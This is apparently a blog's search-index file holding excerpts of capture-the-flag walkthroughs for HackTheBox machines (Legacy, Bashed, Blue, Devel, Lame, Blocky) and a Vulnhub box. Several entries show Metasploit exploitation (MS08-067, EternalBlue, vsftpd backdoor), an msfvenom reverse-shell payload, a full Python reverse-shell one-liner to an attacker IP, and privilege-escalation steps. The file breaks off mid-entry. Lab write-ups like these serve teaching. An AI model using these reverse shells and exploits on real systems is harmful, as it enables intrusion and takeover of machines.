var store = [{
        "title": "Vulnhub EVM",
        "excerpt":"Let’s get started   This is super friendly box intended for Beginner’s   This may work better with VirtualBox than VMware   As always hacking starts with NMAP scan.   ","categories": ["vulnhub"],
        "tags": ["linux,","gobuster,","boot2root"],
        "url": "/vulnhub/Evm/",
        "teaser": "/assets/img/sample/evm.png"
      },{
        "title": "HackTheBox Legacy",
        "excerpt":"Let’s get started   As always hacking starts with NMAP scan.   Nmap scan report for 10.10.10.4 PORT     STATE  SERVICE       VERSION 139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn 445/tcp  open   microsoft-ds  Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%) OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp  Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp  Host script results: |_nbstat: NetBIOS name: LEGACY, NetBIOS user: unknown, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware) | smb-os-discovery:  |   OS: Windows XP (Windows 2000 LAN Manager) |   OS CPE: cpe:/o:microsoft:windows_xp::- |   Computer name: legacy |   NetBIOS computer name: LEGACY\\x00 |   Workgroup: HTB\\x00 | smb-security-mode:  |   account_used: blank |   authentication_level: user |   challenge_response: supported |_  message_signing: disabled (dangerous, but default)   As we can see that it’s a windows [XP] machine, It can be exploited in many ways. The easy way is to use metasploit and take down the machine.   metasploit   msfconsole msf5 &gt; search netapi Matching Modules ================     #  Name                                 Disclosure Date  Rank    Check  Description    -  ----                                 ---------------  ----    -----  -----------    0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow    1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow    2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow    3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption             msf5 &gt; use exploit/windows/smb/ms08_067_netapi     msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhost 10.10.10.4     rhost =&gt; 10.10.10.4     msf5 exploit(windows/smb/ms08_067_netapi) &gt; set lhost tun0     lhost =&gt; tun0     msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit   After the exploit is successfully completed we get the meterpreter shell…       meterpreter &gt; sysinfo     Computer        : LEGACY     OS              : Windows XP (5.1 Build 2600, Service Pack 3).     Architecture    : x86     System Language : en_US     Domain          : HTB     Logged On Users : 1     Meterpreter     : x86/windows   Getting User.txt       meterpreter &gt; ls     Listing: C:\\Documents and Settings\\john\\Desktop     ===============================================     Mode              Size  Type  Last modified              Name     ----              ----  ----  -------------              ----     100444/r--r--r--  32    fil   2017-03-16 02:19:32 -0400  user.txt     meterpreter &gt; cat user.txt     e69af0e4f443de7e36876fda4ec7644f   Getting Root.txt       meterpreter &gt; ls     Listing: C:\\Documents and Settings\\Administrator\\Desktop     ========================================================     Mode              Size  Type  Last modified              Name     ----              ----  ----  -------------              ----     100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt     meterpreter &gt; cat root.txt     993442d258b0e0ec917cae9e695d5713   Gaining both the flags is just so easy.   If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["Windows,","metasploit"],
        "url": "/hackthebox/Legacy/",
        "teaser": "/assets/img/sample/legacy.png"
      },{
        "title": "HackTheBox Bashed",
        "excerpt":"NMAP      Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-06 20:40 EST     Nmap scan report for 10.10.10.68     Host is up (0.098s latency).     Not shown: 999 closed ports     PORT   STATE SERVICE VERSION     80/tcp open  http?      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds   Looks like there is only port80 is open.      It looks like a blog post mentioning a tool phpbash.      So let’s fire up gobuster and see what’s inside.       gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt      Gobuster v1.4.1              OJ Reeves (@TheColonial)     =====================================================     =====================================================     [+] Mode         : dir     [+] Url/Domain   : http://10.10.10.68/     [+] Threads      : 10     [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt     [+] Status codes : 200,204,301,302,307     =====================================================     /images (Status: 301)     /uploads (Status: 301)     /php (Status: 301)     /css (Status: 301)     /dev (Status: 301)     /js (Status: 301)     /fonts (Status: 301)   /dev Looked pretty intresting to me….      Clicking on the link phpbash.php gives a shell:      Getting Reverse-Shell   To get a reverse shell I used the following python command:       python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.18.15\",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'     On the other side I’ve setup a lister       nc -lnvp 5566     listening on [any] 1235 ...     connect to [10.10.18.15] from (UNKNOWN) [10.10.10.68] 49932     /bin/sh: 0: can't access tty; job control turned off          $ python -c 'import pty; pty.spawn(\"/bin/bash\")'     www-data@bashed:/var/www/html/dev$   Privilege Escalation      sudo -l       This means the www-data user can run commands as scriptmanager user. Let’s try to access scriptmanager account shell from www-data with command given below:      sudo -u scriptmanager /bin/bash    Now scriptmanager has access to a folder that www-data could not access. Inside that directory, there are two files.       scriptmanager@bashed:/scripts$ ls -l     total 8     -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 17:03 test.py     -rw-r--r-- 1 root          root          12 Mar  7 04:09 test.txt      scriptmanager@bashed:/scripts$ cat test.py     f = open(\"test.txt\", \"w\")     f.write(\"testing 123!\")     f.close      scriptmanager@bashed:/scripts$ cat test.txt     testing 123!   So seeing the test.py, I modified the test.py to a python reverse-shell script by pentestmonkey.net.       echo \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.18.15\\\",5577));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\" &gt; test.py   On the other side I’ve setup a listner       nc -lnvp 5577     listening on [any] 5577 ...     connect to [10.10.18.15] from (UNKNOWN) [10.10.10.68] 47806     /bin/sh: 0: can't access tty; job control turned off      # id     uid=0(root) gid=0(root) groups=0(root)      # python -c 'import pty; pty.spawn(\"/bin/bash\")'      root@bashed:/scripts# crontab -l     * * * * * cd /scripts; for f in *.py; do python \"$f\"; done      root@bashed:/scripts# wc -l /root/root.txt     33 /root/root.txt   If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["linux,","gobuster"],
        "url": "/hackthebox/Bashed/",
        "teaser": "/assets/img/sample/bashed1.png"
      },{
        "title": "HackTheBox Blue",
        "excerpt":"NMAP scan.       PORT      STATE SERVICE      VERSION     135/tcp   open  msrpc        Microsoft Windows RPC     139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn     445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)     49152/tcp open  msrpc        Microsoft Windows RPC     49153/tcp open  msrpc        Microsoft Windows RPC     49154/tcp open  msrpc        Microsoft Windows RPC     49155/tcp open  msrpc        Microsoft Windows RPC     49156/tcp open  msrpc        Microsoft Windows RPC     49157/tcp open  msrpc        Microsoft Windows RPC     Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port     Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%), Microsoft Windows 8.1 Update 1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%)     No exact OS matches for host (test conditions non-ideal).     Network Distance: 2 hops     Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows      Host script results:     |_clock-skew: mean: 1m33s, deviation: 1s, median: 1m32s     | smb-os-discovery:      |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)     |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional     |   Computer name: haris-PC     |   NetBIOS computer name: HARIS-PC\\x00     |   Workgroup: WORKGROUP\\x00     |_  System time: 2020-03-08T16:52:23+00:00     | smb-security-mode:      |   account_used: guest     |   authentication_level: user     |   challenge_response: supported     |_  message_signing: disabled (dangerous, but default)     | smb2-security-mode:      |   2.02:      |_    Message signing enabled but not required     | smb2-time:      |   date: 2020-03-08T16:52:25     |_  start_date: 2020-03-08T16:46:59      Wowww!!! There are a lot of open ports and I can see that it is a [Windows 7 Professional 7601 Service Pack 1].  We can use many mays to hack into this machine, now I use metasploit to gain the shell of the machine.    Metasploit       msf5 &gt; use  exploit/windows/smb/ms17_010_eternalblue     msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options      Module options (exploit/windows/smb/ms17_010_eternalblue):      Name           Current Setting  Required  Description     ----           ---------------  --------  -----------     RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'     RPORT          445              yes       The target port (TCP)     SMBDomain      .                no        (Optional) The Windows domain to use for authentication     SMBPass                         no        (Optional) The password for the specified username     SMBUser                         no        (Optional) The username to authenticate as     VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.     VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.      Exploit target:     Id  Name     --  ----     0   Windows 7 and Server 2008 R2 (x64) All Service Packs      msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.40     rhosts =&gt; 10.10.10.40     msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.10.14.5     lhost =&gt; 10.10.14.5     msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 4444     lport =&gt; 4444     msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit   After the exploit is successfully completed we get the [Meterpreter] shell…   Getting User.txt       C:\\Users\\haris&gt;cd Desktop     cd Desktop      C:\\Users\\haris\\Desktop&gt;dir     dir     Volume in drive C has no label.     Volume Serial Number is A0EF-1911      Directory of C:\\Users\\haris\\Desktop      24/12/2017  03:23    &lt;DIR&gt;          .     24/12/2017  03:23    &lt;DIR&gt;          ..     21/07/2017  07:54                32 user.txt                 1 File(s)             32 bytes                 2 Dir(s)  15,763,046,400 bytes free      C:\\Users\\haris\\Desktop&gt;type user.txt     type user.txt     4c546aea7dbee75cbd71de245c8deea9   Getting Root.txt       C:\\Users\\Administrator&gt;cd Desktop     cd Desktop      C:\\Users\\Administrator\\Desktop&gt;dir     dir     Volume in drive C has no label.     Volume Serial Number is A0EF-1911      Directory of C:\\Users\\Administrator\\Desktop      24/12/2017  03:22    &lt;DIR&gt;          .     24/12/2017  03:22    &lt;DIR&gt;          ..     21/07/2017  07:57                32 root.txt                 1 File(s)             32 bytes                 2 Dir(s)  15,753,887,744 bytes free      C:\\Users\\Administrator\\Desktop&gt;type root.txt     type root.txt     ff548eb71e920ff6c08843ce9df4e717   This gives us a reverse shell as nt authority\\system and we are able to read the root and user flags   If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","metasploit"],
        "url": "/hackthebox/Blue/",
        "teaser": "/assets/img/sample/blue.png"
      },{
        "title": "HackTheBox Devel",
        "excerpt":"Let’s get started   As always hacking starts with NMAP scan.          Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 11:42 CET         Nmap scan report for 10.10.10.5         Host is up (0.039s latency).         Not shown: 998 filtered ports         PORT   STATE SERVICE VERSION         21/tcp open  ftp     Microsoft ftpd         | ftp-anon: Anonymous FTP login allowed (FTP code 230)         | 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client         | 03-17-17  04:37PM                  689 iisstart.htm         |_03-17-17  04:37PM               184946 welcome.png         | ftp-syst:         |_  SYST: Windows_NT         80/tcp open  http    Microsoft IIS httpd 7.5         | http-methods:         |_  Potentially risky methods: TRACE         |_http-server-header: Microsoft-IIS/7.5         |_http-title: IIS7         Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows          Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .         Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds   From the results of NMAP we can see that port 21 and 80 are open. The NMAP also says that it’s a ISS 7 server. So here is the exploit plan, upload an .aspx through ftp, get the reverse shell and escalate the privilege.       ftp 10.10.10.5     Connected to 10.10.10.5.     220 Microsoft FTP Service     Name (10.10.10.5:ech0): anonymous     331 Anonymous access allowed, send identity (e-mail name) as password.     Password:     230 User logged in.     Remote system type is Windows_NT.      ftp&gt; dir     200 PORT command successful.     125 Data connection already open; Transfer starting.     03-18-17  01:06AM       IR&gt;          aspnet_client     03-17-17  04:37PM                  689 iisstart.htm     03-17-17  04:37PM               184946 welcome.png     226 Transfer complete.   Trying to upload a file through FTP       ftp&gt; put test.html     200 PORT command successful.     125 Data connection already open; Transfer starting.     226 Transfer complete.     16 bytes sent in 0.000144 seconds (114 kbytes/s)   As we can see that FTP file trasfer is successful.   Generating Payload   I’m using msfvenom to generate the reverse shell payload.       msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5566 -f aspx &gt; shell.aspx      [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload     [-] No arch selected, selecting arch: x86 from the payload     No encoder or badchars specified, outputting raw payload     Payload size: 341 bytes     Final size of aspx file: 2824 bytes   As the Payload has been successfully generated, It’s time to upload the file to the victim machine via FTP.       ftp&gt; put shell.aspx     200 PORT command successful.     125 Data connection already open; Transfer starting.     226 Transfer complete.     2860 bytes sent in 0.000315 seconds (8.66 Mbytes/s)   Setting up the listner in msfconsole       msf5 &gt; use exploit/multi/handler      msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp     payload =&gt; windows/meterpreter/reverse_tcp      msf5 exploit(multi/handler) &gt; set LHOST tun0     LHOST =&gt; 10.10.*.*      msf5 exploit(multi/handler) &gt; set LPORT 5566     LPORT =&gt; 9001      msf5 exploit(multi/handler) &gt; show options      Module options (exploit/multi/handler):      Name  Current Setting  Required  Description     ----  ---------------  --------  -----------      Payload options (windows/meterpreter/reverse_tcp):      Name      Current Setting  Required  Description     ----      ---------------  --------  -----------     EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)     LHOST     tun0      yes       The listen address (an interface may be specified)     LPORT     5566             yes       The listen port      Exploit target:      Id  Name     --  ----     0   Wildcard Target   Running the exploit command and opening the shell.aspx in the browser, gave me a meterpreter session       msf5 exploit(multi/handler) &gt; exploit      [*] Started reverse TCP handler on 10.10.*.*:5566     [*] Sending stage (180291 bytes) to 10.10.10.5     [*] Meterpreter session 1 opened (10.10.*.*:5566 -&gt; 10.10.10.5:49158)       meterpreter &gt; getuid     Server username: IIS APPPOOL\\Web   As seeing the UID, we need to escalate our privileges to gain NT/Authority.   Privilege Escalation   For this part we need a exploit suggester, so I went with a Exploit Suggester module use post/multi/recon/local_exploit_suggester from metasploit.   After the run of Exploit Suggester, I used  exploit/windows/local/ms10_015_kitrap0d for PE.       meterpreter &gt; background     [*] Backgrounding session 1...     msf5 exploit(multi/handler) &gt;      msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms10_015_kitrap0d      msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set session 1     session =&gt; 1      msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set lhost tun0     lhost =&gt; tun0      msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set lport 5577     lport =&gt; 557      msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit      [*] Started reverse TCP handler on tun0:5577     [*] Launching notepad to host the exploit...     [+] Process 3372 launched.     [*] Reflectively injecting the exploit DLL into 3372...     [*] Injecting exploit into 3372 ...     [*] Exploit injected. Injecting payload into 3372...     [*] Payload injected. Executing exploit...     [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.     [*] Sending stage (179779 bytes) to 10.10.10.5     [*] Meterpreter session 2 opened (10.10.*.*:5577 -&gt; 10.10.10.5:49159)      meterpreter &gt; getuid     Server username: NT AUTHORITY\\SYSTEM   Getting User.txt   c:\\Users\\babis\\Desktop&gt; type user.txt   **********   Getting Root.txt   c:\\Users\\Administrator\\Desktop&gt; type root.txt   **********   If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["hackthebox"],
        "tags": ["windows,","metasploit"],
        "url": "/hackthebox/Devel/",
        "teaser": "/assets/img/sample/devel.png"
      },{
        "title": "HackTheBox Lame",
        "excerpt":"As always hacking starts with NMAP scan.       PORT    STATE SERVICE     VERSION     21/tcp  open  ftp         vsftpd 2.3.4     |_ftp-anon: Anonymous FTP login allowed (FTP code 230)     | ftp-syst:      |   STAT:      | FTP server status:     |      Connected to 10.10.14.10     |      Logged in as ftp     |      TYPE: ASCII     |      No session bandwidth limit     |      Session timeout in seconds is 300     |      Control connection is plain text     |      Data connections will be plain text     |      vsFTPd 2.3.4 - secure, fast, stable     |_End of status     22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)     | ssh-hostkey:      |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)     |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)     139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)     445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)     Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port     Aggressive OS guesses: Arris TG562G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Linksys WRV54G WAP (92%)     No exact OS matches for host (test conditions non-ideal).     Uptime guess: 0.076 days (since Thu Oct  3 15:52:27 2019)     Network Distance: 2 hops     TCP Sequence Prediction: Difficulty=192 (Good luck!)     IP ID Sequence Generation: All zeros     Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel      Host script results:     |_clock-skew: mean: 4h00m23s, deviation: 0s, median: 4h00m23s     | smb-os-discovery:      |   OS: Unix (Samba 3.0.20-Debian)     |   NetBIOS computer name:      |   Workgroup: WORKGROUP\\x00     |_  System time: 2019-10-03T16:41:57-04:00     |_smb2-time: Protocol negotiation failed (SMB2)   Finding exploit for VSFTPD-2.3.4.   I searched for any exploits in the “metasploit” for ftp services, and found some inbuilt backdoor for FTP service “vsftpd 2.3.4”.   Description of “vsftpd 2.3.4”.   This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.   Exploitation   After all the configuration part is done, we are ready for the exploit…       msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor     msf exploit(vsftpd_234_backdoor) &gt; show targets         ...targets...     msf exploit(vsftpd_234_backdoor) &gt; set TARGET &lt; target-id &gt;     msf exploit(vsftpd_234_backdoor) &gt; show options         ...show and set options...     msf exploit(vsftpd_234_backdoor) &gt; exploit   After a Successful exploit we get the shell as root@lame.   Getting User.txt       root@lame:/# whoami     whoami     root     root@lame:/# cat /home/makis/user.txt     cat /home/makis/user.txt     69454a937d94f5f0225ea00acd2e84c5   Getting Root.txt       root@lame:/# cat ~/root.txt     cat ~/root.txt     92caac3be140ef409e45721348a4e9df     root@lame:/#    If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["hackthebox"],
        "tags": ["linux"],
        "url": "/hackthebox/Lame/",
        "teaser": "/assets/img/sample/lame.png"
      },{
        "title": "HackTheBox Blocky",
        "excerpt":"NMAP scan.   Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT Nmap scan report for 10.10.10.37 Host is up (0.015s latency).  PORT      STATE  SERVICE   REASON         VERSION 21/tcp    open   ftp       syn-ack ttl 63 ProFTPD 1.3.5a 22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods:  |_  Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft &amp;#8211; Under Construction! 8192/tcp  closed sophos    reset ttl 63 25565/tcp open   minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux    This Looks like a wordpress site      Gobuster   Let’s find out the other files and dir on the wordpress site.      ===============================================================     Gobuster v3.0.1     by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@FireFart)     ===============================================================     [+] Url:            http://10.10.10.37     [+] Threads:        10     [+] Wordlist:       /usr/share/wordlists/dirb/common.txt     [+] Status codes:   200,204,301,302,307,401,403     [+] User Agent:     gobuster/3.0.1     [+] Timeout:        10s     ===============================================================     Starting gobuster     ===============================================================     /.hta (Status: 403)     /.htaccess (Status: 403)     /.htpasswd (Status: 403)     /index.php (Status: 301)     /javascript (Status: 301)     /phpmyadmin (Status: 301)     /plugins (Status: 301)     /server-status (Status: 403)     /wiki (Status: 301)     /wp-admin (Status: 301)     /wp-content (Status: 301)     /wp-includes (Status: 301)     ===============================================================   Finding Users using WPSCAN   Checking the users….     _____________________             __          ___   ___             \\ \\        / /  __ \\ / __|             \\ \\  /\\  / /| |) | (_   ___  __ _ _ __ ®             \\ \\/  \\/ / |  __/ ___ \\ / __|/ _` | ‘                   \\  /\\  /  | |     __) | (| (| | | | |                 \\/  \\/   ||    |/ _|_,|| |_|           WordPress Security Scanner by the WPScan Team                         Version 3.8.2     Sponsored by Automattic - https://automattic.com/     @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________  [+] URL: http://10.10.10.37/ [10.10.10.37]  Interesting Finding(s):  [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%  [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  [+] http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%  [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%  [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299  [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) |  - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; |  - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;  [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'  [+] Enumerating All Plugins (via Passive Methods)  [i] No plugins Found.  [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)  Checking Known Locations -: |==============================================================================================================================================================================================================================================| [+] Checking Theme Versions (via Passive and Aggressive Methods)  [i] Theme(s) Identified:  [+] twentyfifteen | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.6 | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) |  - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) |  - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'  [+] twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.3 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) |  - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'  [+] twentysixteen | Location: http://10.10.10.37/wp-content/themes/twentysixteen/ | Last Updated: 2020-03-31T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.1 | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) |  - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) |  - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'  [+] Enumerating Timthumbs (via Passive and Aggressive Methods)  Checking Known Locations -: |==============================================================================================================================================================================================================================================|  [i] No Timthumbs Found.  [+] Enumerating Users (via Passive and Aggressive Methods)  Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================|  [i] User(s) Identified:  [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)  [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)  [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up  [+] Requests Done: 2989 [+] Cached Requests: 66 [+] Data Sent: 742.701 KB [+] Data Received: 418.53 KB [+] Memory used: 227.039 MB [+] Elapsed time: 00:00:13   So the user identified as notch   [i] User(s) Identified:  [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages 